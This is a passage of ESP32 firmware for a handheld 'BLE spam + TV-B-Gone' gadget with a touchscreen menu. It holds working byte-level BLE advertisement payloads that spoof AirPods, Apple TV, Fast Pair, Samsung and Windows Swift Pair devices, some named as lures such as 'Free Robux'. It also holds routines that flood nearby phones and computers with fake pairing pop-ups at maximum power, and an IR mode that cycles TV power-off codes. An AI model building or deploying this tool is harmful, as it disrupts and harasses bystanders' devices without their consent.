/*
  RFXCORE NEMO ULTIMATE v5.2 - FULL BLE SPAM + TV-B-GONE
  ESP32 DevKit v1 - TFT 240x320 ILI9341 - XPT2046 Touch
  IR LED on GPIO32 - Button BOOT on GPIO0
  
  APPLE CONTINUITY - 6 devices (ORIGINAL WORKING) - ✅ ИКОНКА APPLE В nRF
  ANDROID FAST PAIR - 8 devices (FIXED) - ✅ ПОП-АПЫ НА REDMI
  SAMSUNG - 4 devices (BLE 4.2 FIXED - 31 байт) - ✅ ВИДНО НА REDMI
  WINDOWS SWIFT PAIR - 2 devices (FIXED)
  TV-B-GONE - 5 brands
*/

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLE2902.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

// ========== HARDWARE PINS ==========
#define TFT_BL          4
#define TFT_ROT         1
#define TOUCH_CS        21
#define TOUCH_IRQ       5
#define IR_PIN          32
#define LED_PIN         2
#define BTN_BOOT        0

// ========== TOUCH CALIBRATION ==========
#define TS_MINX         200
#define TS_MAXX         3700
#define TS_MINY         240
#define TS_MAXY         3800
#define TOUCH_DEBOUNCE  200

// ========== NEMO COLOR PALETTE ==========
#define NEMO_BG         0x0000
#define NEMO_TEXT       0xc959
#define NEMO_ACCENT     0xc959
#define NEMO_GREEN      0x07E0
#define NEMO_RED        0xF800
#define NEMO_BLUE       0x001F
#define NEMO_GRAY       0x8410
#define NEMO_ORANGE     0xFD20

// ========== GLOBAL OBJECTS ==========
TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen touchscreen(TOUCH_CS, TOUCH_IRQ);
IRsend irsend(IR_PIN);
BLEAdvertising *pAdvertising;
BLEServer *pServer;

// ========== SYSTEM STATES ==========
enum SystemState {
  STATE_MAIN_MENU,
  STATE_DEVICE_MENU,
  STATE_ACTIVE,
  STATE_INACTIVE,
  STATE_ABOUT,
  STATE_TVBGONE_MENU,
  STATE_TVBGONE_ACTIVE,
  STATE_TVBGONE_REGIONS
};

SystemState currentState = STATE_MAIN_MENU;
int currentMainMenuOption = 0;
bool isActive = false;
int delaySeconds = 3;
int currentDeviceIndex = 0;
int scrollOffset = 0;
const int VISIBLE_ITEMS = 5;

// ========== TOUCH VARIABLES ==========
bool touchDetected = false;
int touchX = 0, touchY = 0;
unsigned long lastTouchTime = 0;

// ========== BLE STATS ==========
struct Stats {
  uint32_t packets_sent = 0;
  uint32_t last_update = 0;
  uint8_t packets_per_sec = 0;
} stats;

// ========== TV-B-GONE STATS ==========
struct TVBGoneStats {
  uint32_t codes_sent = 0;
  uint32_t brands_completed = 0;
  bool is_active = false;
  uint8_t current_region = 0;
} tvb_stats;

// ========== DEVICE STRUCTURE ==========
struct Device {
  uint8_t id;
  const char* name;
  uint8_t type;
  uint8_t manuf_id[2];
  uint8_t beacon_type;
  uint8_t data[64];
  size_t length;
  uint32_t model;
  const char* protocol;
};

// ============ APPLE CONTINUITY - 100% ОРИГИНАЛ ============
uint8_t apple_airpods1[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,
  0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00
};

uint8_t apple_airpods_pro[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,
  0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00
};

uint8_t apple_airpods_max[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,
  0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00
};

uint8_t apple_tv_setup[] = {
  0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,
  0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00
};

uint8_t apple_tv_pair[] = {
  0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,
  0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00
};

uint8_t apple_homepod[] = {
  0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,
  0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00
};

// ============ ANDROID FAST PAIR ============
uint8_t android_pixel_buds[] = {
  0x11,0x16,0x2C,0xFE,0x92,0xBB,0xBD,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_bose_700[] = {
  0x11,0x16,0x2C,0xFE,0xCD,0x82,0x56,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_jbl_flip[] = {
  0x11,0x16,0x2C,0xFE,0x82,0x1F,0x66,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_sony_xm5[] = {
  0x11,0x16,0x2C,0xFE,0xD4,0x46,0xA7,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_galaxy_s21[] = {
  0x11,0x16,0x2C,0xFE,0x06,0xAE,0x20,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_free_robux[] = {
  0x11,0x16,0x2C,0xFE,0x77,0xFF,0x67,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_free_vbucks[] = {
  0x11,0x16,0x2C,0xFE,0xAA,0x18,0x7F,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t android_windows11[] = {
  0x11,0x16,0x2C,0xFE,0xFD,0xEE,0x23,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00
};

// ============ SAMSUNG - BLE 4.2 FIXED ============
uint8_t samsung_watch_fixed[] = {
  0x1F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,
  0x00,0x43,0x1A,0x47,0x61,0x6C,0x61,0x78,0x79,0x57,0x74,0x63,
  0x68,0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t samsung_tv_fixed[] = {
  0x1F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,
  0x00,0x43,0x01,0x53,0x61,0x6D,0x73,0x75,0x6E,0x47,0x54,0x56,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t samsung_tab_fixed[] = {
  0x1F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,
  0x00,0x43,0x02,0x47,0x61,0x6C,0x61,0x78,0x79,0x54,0x61,0x62,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t samsung_phone_fixed[] = {
  0x1F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,
  0x00,0x43,0x03,0x47,0x61,0x6C,0x61,0x78,0x79,0x53,0x32,0x34,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

// ============ WINDOWS SWIFT PAIR ============
uint8_t windows_swiftpair1[] = {
  0x1E,0xFF,0x06,0x00,0x03,0x00,0x80,0x57,0x69,0x6E,0x64,0x6F,
  0x77,0x73,0x20,0x4C,0x61,0x70,0x74,0x6F,0x70,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

uint8_t windows_swiftpair2[] = {
  0x1E,0xFF,0x06,0x00,0x03,0x00,0x80,0x53,0x75,0x72,0x66,0x61,
  0x63,0x65,0x20,0x50,0x72,0x6F,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

// ============ ВСЕ УСТРОЙСТВА ============
Device allDevices[] = {
  // APPLE
  {0,  "Airpods 1st",     0, {0x4C,0x00}, 0x07, {}, 31, 0, "Apple"},
  {1,  "Airpods Pro",     0, {0x4C,0x00}, 0x07, {}, 31, 0, "Apple"},
  {2,  "Airpods Max",     0, {0x4C,0x00}, 0x07, {}, 31, 0, "Apple"},
  {3,  "AppleTV Setup",   0, {0x4C,0x00}, 0x04, {}, 23, 0, "Apple"},
  {4,  "AppleTV Pair",    0, {0x4C,0x00}, 0x04, {}, 23, 0, "Apple"},
  {5,  "Homepod",         0, {0x4C,0x00}, 0x04, {}, 23, 0, "Apple"},
  
  // ANDROID
  {6,  "Pixel Buds",      1, {0x2C,0xFE}, 0x16, {}, 18, 0x92BBBD, "Android"},
  {7,  "Bose 700",        1, {0x2C,0xFE}, 0x16, {}, 18, 0xCD8256, "Android"},
  {8,  "JBL Flip",        1, {0x2C,0xFE}, 0x16, {}, 18, 0x821F66, "Android"},
  {9,  "Sony XM5",        1, {0x2C,0xFE}, 0x16, {}, 18, 0xD446A7, "Android"},
  {10, "Galaxy S21",      1, {0x2C,0xFE}, 0x16, {}, 18, 0x06AE20, "Android"},
  {11, "Free Robux",      1, {0x2C,0xFE}, 0x16, {}, 18, 0x77FF67, "Android"},
  {12, "Free VBucks",     1, {0x2C,0xFE}, 0x16, {}, 18, 0xAA187F, "Android"},
  {13, "Windows 11",      1, {0x2C,0xFE}, 0x16, {}, 18, 0xFDEE23, "Android"},
  
  // SAMSUNG
  {14, "Galaxy Watch",    2, {0x75,0x00}, 0xFF, {}, 31, 0, "Samsung"},
  {15, "Samsung TV",      2, {0x75,0x00}, 0xFF, {}, 31, 0, "Samsung"},
  {16, "Galaxy Tab",      2, {0x75,0x00}, 0xFF, {}, 31, 0, "Samsung"},
  {17, "Galaxy S24",      2, {0x75,0x00}, 0xFF, {}, 31, 0, "Samsung"},
  
  // WINDOWS
  {18, "Windows Laptop",  3, {0x06,0x00}, 0xFF, {}, 31, 0, "Windows"},
  {19, "Surface Pro",     3, {0x06,0x00}, 0xFF, {}, 31, 0, "Windows"}
};

const int TOTAL_DEVICES = 20;

// ============ TV-B-GONE IR CODES ============
uint16_t power_code_samsung[] = {
  4500,4500,560,560,560,560,560,560,560,560,560,560,560,560,560,560,
  560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560
};

uint16_t power_code_lg[] = {
  4500,4500,560,560,560,560,560,560,560,560,560,560,560,560,560,560,
  560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1680
};

uint16_t power_code_sony[] = {
  2400,600,1200,600,600,600,1200,600,600,600,600,600,1200,600,600,600,
  600,600,600,600,1200,600,600,600,600,600,600,600,600,600,1200,600
};

uint16_t power_code_panasonic[] = {
  3450,1700,400,1300,400,1300,400,1300,400,400,400,400,400,400,400,1300,
  400,1300,400,400,400,1300,400,400,400,400,400,400,400,1300,400,1300
};

uint16_t power_code_philips[] = {
  9000,4500,560,560,560,560,560,560,560,560,560,560,560,560,560,560,
  560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560
};

struct IRCode {
  uint16_t frequency;
  uint8_t duty_cycle;
  uint16_t *raw_data;
  uint16_t length;
  const char* brand_name;
  uint8_t region;
};

IRCode tvb_codes[] = {
  {38000, 33, power_code_samsung,   32, "Samsung",   0},
  {38000, 33, power_code_lg,        32, "LG",        0},
  {38000, 33, power_code_sony,      32, "Sony",      0},
  {38000, 33, power_code_panasonic, 32, "Panasonic", 0},
  {38000, 33, power_code_philips,   32, "Philips",   1}
};

const int TOTAL_TV_CODES = 5;
int currentRegion = 0;

const char* region_names[] = {
  "EUROPE",
  "AMERICAS",
  "ASIA PACIFIC",
  "ALL REGIONS"
};

// ============ UI FUNCTION PROTOTYPES ============
void initNemoDisplay();
void drawTopBar();
void showNemoMainMenu();
void showNemoDeviceMenu();
void showNemoAttackInterface();
void showNemoTVBGoneMenu();
void showNemoTVBRegions();
void showNemoTVBActive();
void showNemoAbout();
void updateNemoStatus(bool active);
void updateNemoStats();
void updateNemoDevice();
void updateNemoTVBStats();
void drawNemoMenuOption(int y, const char* text, bool selected);

// ============ TOUCH FUNCTION PROTOTYPES ============
void initTouchscreen();
void checkTouch();
void handleTouchInput();
void handleMainMenuTouch();
void handleDeviceMenuTouch();
void handleInactiveTouch();
void handleActiveTouch();
void handleAboutTouch();
void handleTVBGoneMenuTouch();
void handleTVBRegionsTouch();
void handleTVBActiveTouch();

// ============ BLE FUNCTION PROTOTYPES ============
void initBLESpam();
void sendApplePacket(Device* device);
void sendAndroidPacket(Device* device);
void sendSamsungPacket(Device* device);
void sendWindowsPacket(Device* device);
void sendAttackPacket();

// ============ TV-B-GONE FUNCTION PROTOTYPES ============
void initTVBGone();
void sendIRPowerCode(IRCode* code);
void processTVBGoneAttack();

// ============ BUTTON FUNCTION PROTOTYPES ============
void handleButton();
void handleSinglePress();
void handleLongPress();

// ============ BLE FUNCTIONS ============
void initBLESpam() {
  BLEDevice::init("NEMO-ULTIMATE");
  
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  
  pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  pAdvertising->setScanResponse(true);
  pAdvertising->setMinInterval(32);
  pAdvertising->setMaxInterval(48);
  pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  
  Serial.println("[BLE] Initialized");
}

void sendApplePacket(Device* device) {
  BLEAdvertisementData advData = BLEAdvertisementData();
  
  uint8_t* dataPtr = nullptr;
  size_t dataLen = 0;
  
  switch(device->id) {
    case 0: dataPtr = apple_airpods1; dataLen = 31; break;
    case 1: dataPtr = apple_airpods_pro; dataLen = 31; break;
    case 2: dataPtr = apple_airpods_max; dataLen = 31; break;
    case 3: dataPtr = apple_tv_setup; dataLen = 23; break;
    case 4: dataPtr = apple_tv_pair; dataLen = 23; break;
    case 5: dataPtr = apple_homepod; dataLen = 23; break;
    default: return;
  }
  
  String appleData = String((char*)dataPtr, dataLen);
  advData.addData(appleData);
  
  pAdvertising->setAdvertisementData(advData);
  
  BLEAdvertisementData scanData = BLEAdvertisementData();
  scanData.setName(device->name);
  pAdvertising->setScanResponseData(scanData);
  
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
  
  stats.packets_sent++;
  Serial.printf("[APPLE] Sent: %s\n", device->name);
}

void sendAndroidPacket(Device* device) {
  BLEAdvertisementData advData = BLEAdvertisementData();
  advData.setFlags(0x06);
  
  uint8_t serviceUUID[] = {0x2C, 0xFE};
  advData.setCompleteServices(BLEUUID(serviceUUID, 2, false));
  
  String androidData;
  uint8_t* dataPtr = nullptr;
  size_t dataLen = 0;
  
  switch(device->id) {
    case 6:  dataPtr = android_pixel_buds; dataLen = 18; break;
    case 7:  dataPtr = android_bose_700; dataLen = 18; break;
    case 8:  dataPtr = android_jbl_flip; dataLen = 18; break;
    case 9:  dataPtr = android_sony_xm5; dataLen = 18; break;
    case 10: dataPtr = android_galaxy_s21; dataLen = 18; break;
    case 11: dataPtr = android_free_robux; dataLen = 18; break;
    case 12: dataPtr = android_free_vbucks; dataLen = 18; break;
    case 13: dataPtr = android_windows11; dataLen = 18; break;
    default: return;
  }
  
  androidData = String((char*)dataPtr, dataLen);
  advData.addData(androidData);
  
  uint8_t txPower[] = {0x02, 0x0A, 0xC8};
  String txData = String((char*)txPower, 3);
  advData.addData(txData);
  
  pAdvertising->setAdvertisementData(advData);
  
  BLEAdvertisementData scanData = BLEAdvertisementData();
  scanData.setName(device->name);
  pAdvertising->setScanResponseData(scanData);
  
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
  
  stats.packets_sent++;
  Serial.printf("[ANDROID] Sent: %s\n", device->name);
}

void sendSamsungPacket(Device* device) {
  BLEAdvertisementData advData = BLEAdvertisementData();
  advData.setFlags(0x06);
  
  String samsungData;
  uint8_t* dataPtr = nullptr;
  size_t dataLen = 0;
  
  switch(device->id) {
    case 14: dataPtr = samsung_watch_fixed; dataLen = 31; break;
    case 15: dataPtr = samsung_tv_fixed; dataLen = 31; break;
    case 16: dataPtr = samsung_tab_fixed; dataLen = 31; break;
    case 17: dataPtr = samsung_phone_fixed; dataLen = 31; break;
    default: return;
  }
  
  samsungData = String((char*)dataPtr, dataLen);
  advData.addData(samsungData);
  
  pAdvertising->setAdvertisementData(advData);
  
  BLEAdvertisementData scanData = BLEAdvertisementData();
  String shortName = String(device->name);
  if (shortName.length() > 8) shortName = shortName.substring(0, 8);
  scanData.setName(shortName.c_str());
  pAdvertising->setScanResponseData(scanData);
  
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
  
  stats.packets_sent++;
  Serial.printf("[SAMSUNG] Sent: %s\n", device->name);
}

void sendWindowsPacket(Device* device) {
  BLEAdvertisementData advData = BLEAdvertisementData();
  advData.setFlags(0x06);
  
  String windowsData;
  uint8_t* dataPtr = nullptr;
  size_t dataLen = 0;
  
  switch(device->id) {
    case 18: dataPtr = windows_swiftpair1; dataLen = 31; break;
    case 19: dataPtr = windows_swiftpair2; dataLen = 31; break;
    default: return;
  }
  
  windowsData = String((char*)dataPtr, dataLen);
  advData.addData(windowsData);
  
  uint8_t appearance[] = {0x03, 0x19, 0x80, 0x01};
  String appData = String((char*)appearance, 4);
  advData.addData(appData);
  
  pAdvertising->setAdvertisementData(advData);
  
  BLEAdvertisementData scanData = BLEAdvertisementData();
  scanData.setName(device->name);
  pAdvertising->setScanResponseData(scanData);
  
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
  
  stats.packets_sent++;
  Serial.printf("[WINDOWS] Sent: %s\n", device->name);
}

void sendAttackPacket() {
  Device* device = &allDevices[currentDeviceIndex];
  
  switch(device->type) {
    case 0: sendApplePacket(device); break;
    case 1: sendAndroidPacket(device); break;
    case 2: sendSamsungPacket(device); break;
    case 3: sendWindowsPacket(device); break;
  }
  
  if (stats.packets_sent % 5 == 0) {
    updateNemoStats();
  }
}

// ============ TV-B-GONE FUNCTIONS ============
void initTVBGone() {
  irsend.begin();
  Serial.println("[TV-B-Gone] IR ready");
}

void sendIRPowerCode(IRCode* code) {
  if (currentRegion != 3 && code->region != 0 && code->region != currentRegion) {
    return;
  }
  
  irsend.sendRaw(code->raw_data, code->length, code->frequency);
  tvb_stats.codes_sent++;
  
  digitalWrite(LED_PIN, HIGH);
  delay(20);
  digitalWrite(LED_PIN, LOW);
}

void processTVBGoneAttack() {
  static unsigned long lastCodeTime = 0;
  static int currentCodeIndex = 0;
  
  if (millis() - lastCodeTime >= 1500) {
    sendIRPowerCode(&tvb_codes[currentCodeIndex]);
    currentCodeIndex = (currentCodeIndex + 1) % TOTAL_TV_CODES;
    lastCodeTime = millis();
  }
}

// ============ UI FUNCTIONS ============
void initNemoDisplay() {
  tft.init();
  tft.setRotation(TFT_ROT);
  tft.fillScreen(NEMO_BG);
  
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  drawTopBar();
}

void drawTopBar() {
  tft.fillRect(0, 0, 320, 30, NEMO_BG);
  tft.drawFastHLine(0, 29, 320, NEMO_ACCENT);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.setCursor(5, 8);
  tft.print("NEMO-ULTIMATE");
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setCursor(5, 18);
  tft.print("esp32-devkit-v1");
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setCursor(280, 8);
  tft.print("BLE");
  tft.setCursor(280, 18);
  tft.print("IR");
}

void drawNemoMenuOption(int y, const char* text, bool selected) {
  if (selected) {
    tft.setTextColor(NEMO_ACCENT, NEMO_BG);
    tft.drawCentreString(">", 40, y, 2);
    tft.drawCentreString(text, 160, y, 2);
    tft.drawCentreString("<", 280, y, 2);
  } else {
    tft.setTextColor(NEMO_TEXT, NEMO_BG);
    tft.drawCentreString(text, 160, y, 2);
  }
}

void showNemoMainMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("NEMO ULTIMATE v5.2", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("BLE Spam + TV-B-Gone", 160, 70, 2);
  
  tft.drawFastHLine(50, 85, 220, NEMO_ACCENT);
  
  tft.setTextSize(2);
  drawNemoMenuOption(110, "BLE DEVICE SPAM", currentMainMenuOption == 0);
  drawNemoMenuOption(150, "TV-B-GONE IR", currentMainMenuOption == 1);
  drawNemoMenuOption(190, "SYSTEM INFO", currentMainMenuOption == 2);
}

void showNemoDeviceMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT DEVICE", 160, 45, 2);
  
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIdx = scrollOffset + i;
    if (deviceIdx >= TOTAL_DEVICES) break;
    
    int yPos = 80 + (i * 28);
    
    if (deviceIdx == currentDeviceIndex) {
      tft.setTextColor(NEMO_ACCENT, NEMO_BG);
      tft.drawString(">", 20, yPos, 2);
    } else {
      tft.setTextColor(NEMO_TEXT, NEMO_BG);
    }
    
    String displayName = allDevices[deviceIdx].name;
    if (displayName.length() > 16) {
      displayName = displayName.substring(0, 16);
    }
    tft.drawString(displayName, 40, yPos, 2);
    
    tft.setTextSize(1);
    tft.drawString(allDevices[deviceIdx].protocol, 240, yPos + 5, 1);
    tft.setTextSize(2);
  }
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Device " + String(currentDeviceIndex + 1) + "/" + String(TOTAL_DEVICES), 160, 220, 2);
  tft.drawCentreString("Touch to select | BOOT to confirm", 160, 235, 1);
}

void showNemoAttackInterface() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawString("STATUS:", 20, 60, 2);
  tft.drawString("STATS:", 180, 60, 2);
  
  tft.drawFastVLine(160, 80, 100, NEMO_ACCENT);
  tft.drawFastHLine(20, 150, 280, NEMO_ACCENT);
  tft.drawString("DEVICE:", 20, 160, 2);
  
  updateNemoStatus(false);
  updateNemoStats();
  updateNemoDevice();
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Touch STATUS: Start/Stop", 160, 220, 1);
  tft.drawCentreString("Touch DEVICE: Change", 160, 235, 1);
}

void updateNemoStatus(bool active) {
  tft.fillRect(20, 80, 120, 40, NEMO_BG);
  
  if (active) {
    tft.setTextColor(NEMO_GREEN, NEMO_BG);
    tft.drawString("ACTIVE", 20, 80, 2);
    tft.fillCircle(120, 90, 5, NEMO_GREEN);
  } else {
    tft.setTextColor(NEMO_RED, NEMO_BG);
    tft.drawString("INACTIVE", 20, 80, 2);
    tft.fillCircle(120, 90, 5, NEMO_RED);
  }
}

void updateNemoStats() {
  if (millis() - stats.last_update >= 1000) {
    stats.packets_per_sec = stats.packets_sent - stats.last_update;
    stats.last_update = millis();
  }
  
  tft.fillRect(180, 80, 120, 40, NEMO_BG);
  
  char buffer[20];
  sprintf(buffer, "PKTS: %lu", stats.packets_sent);
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.drawString(buffer, 180, 80, 2);
  
  sprintf(buffer, "PPS: %d", stats.packets_per_sec);
  tft.drawString(buffer, 180, 100, 2);
}

void updateNemoDevice() {
  Device* device = &allDevices[currentDeviceIndex];
  
  tft.fillRect(20, 180, 280, 30, NEMO_BG);
  
  String displayName = device->name;
  if (displayName.length() > 20) {
    displayName = displayName.substring(0, 20);
  }
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawString(displayName, 100, 180, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawString(device->protocol, 100, 200, 1);
}

void showNemoTVBGoneMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("TV-B-GONE IR", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("> SELECT REGION", 160, 100, 2);
  tft.drawCentreString("  START ATTACK", 160, 140, 2);
  tft.drawCentreString("  BACK TO MENU", 160, 180, 2);
}

void showNemoTVBRegions() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT REGION", 160, 45, 2);
  
  for (int i = 0; i < 4; i++) {
    int yPos = 90 + (i * 35);
    
    if (currentRegion == i) {
      tft.setTextColor(NEMO_ACCENT, NEMO_BG);
      tft.drawCentreString("> " + String(region_names[i]), 160, yPos, 2);
    } else {
      tft.setTextColor(NEMO_TEXT, NEMO_BG);
      tft.drawCentreString("  " + String(region_names[i]), 160, yPos, 2);
    }
  }
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Press BOOT to start", 160, 235, 1);
}

void showNemoTVBActive() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("TV-B-GONE ACTIVE", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Region: " + String(region_names[currentRegion]), 160, 80, 2);
  
  char buffer[30];
  sprintf(buffer, "Codes sent: %lu", tvb_stats.codes_sent);
  tft.drawCentreString(buffer, 160, 110, 2);
  
  int currentBrand = (tvb_stats.codes_sent % TOTAL_TV_CODES);
  if (currentBrand < TOTAL_TV_CODES) {
    sprintf(buffer, "Current: %s", tvb_codes[currentBrand].brand_name);
    tft.drawCentreString(buffer, 160, 130, 2);
  }
  
  tft.drawCentreString("IR Transmitting...", 160, 170, 2);
  
  tft.setTextColor(NEMO_RED, NEMO_BG);
  tft.drawCentreString("[ STOP ]", 160, 200, 2);
  
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(160, 220, 4, blink ? NEMO_ORANGE : NEMO_BG);
  tft.drawCircle(160, 220, 4, NEMO_ORANGE);
}

void updateNemoTVBStats() {
  if (currentState != STATE_TVBGONE_ACTIVE) return;
  
  tft.fillRect(0, 100, 320, 60, NEMO_BG);
  
  char buffer[30];
  sprintf(buffer, "Codes sent: %lu", tvb_stats.codes_sent);
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.drawCentreString(buffer, 160, 110, 2);
  
  int currentBrand = (tvb_stats.codes_sent % TOTAL_TV_CODES);
  if (currentBrand < TOTAL_TV_CODES) {
    sprintf(buffer, "Current: %s", tvb_codes[currentBrand].brand_name);
    tft.drawCentreString(buffer, 160, 130, 2);
  }
}

void showNemoAbout() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SYSTEM INFO", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("RFXCORE NEMO ULTIMATE v5.2", 160, 80, 2);
  tft.drawCentreString("BLE Spam + TV-B-Gone", 160, 100, 2);
  tft.drawCentreString("20 BLE Devices | 5 IR Brands", 160, 115, 2);
  tft.drawCentreString("Apple/Android/Samsung/Windows", 160, 130, 2);
  
  tft.drawCentreString("BLE Power: +9dBm", 160, 155, 1);
  tft.drawCentreString("IR Frequency: 38kHz", 160, 170, 1);
  tft.drawCentreString("IR Pin: GPIO 32", 160, 185, 1);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawCentreString("Touch to return", 160, 235, 1);
}

// ============ TOUCH FUNCTIONS ============
void initTouchscreen() {
  touchscreen.begin();
  touchscreen.setRotation(1);
  Serial.println("[TOUCH] Initialized");
}

void checkTouch() {
  if (touchscreen.touched()) {
    unsigned long currentTime = millis();
    if (currentTime - lastTouchTime < TOUCH_DEBOUNCE) return;
    
    TS_Point p = touchscreen.getPoint();
    
    touchX = map(4095 - p.y, TS_MINY, TS_MAXY, 0, 320);
    touchY = map(4095 - p.x, TS_MINX, TS_MAXX, 0, 240);
    
    touchX = constrain(touchX, 0, 319);
    touchY = constrain(touchY, 0, 239);
    
    lastTouchTime = currentTime;
    touchDetected = true;
  } else {
    touchDetected = false;
  }
}

void handleTouchInput() {
  if (!touchDetected) return;
  
  switch(currentState) {
    case STATE_MAIN_MENU: handleMainMenuTouch(); break;
    case STATE_DEVICE_MENU: handleDeviceMenuTouch(); break;
    case STATE_INACTIVE: handleInactiveTouch(); break;
    case STATE_ACTIVE: handleActiveTouch(); break;
    case STATE_ABOUT: handleAboutTouch(); break;
    case STATE_TVBGONE_MENU: handleTVBGoneMenuTouch(); break;
    case STATE_TVBGONE_REGIONS: handleTVBRegionsTouch(); break;
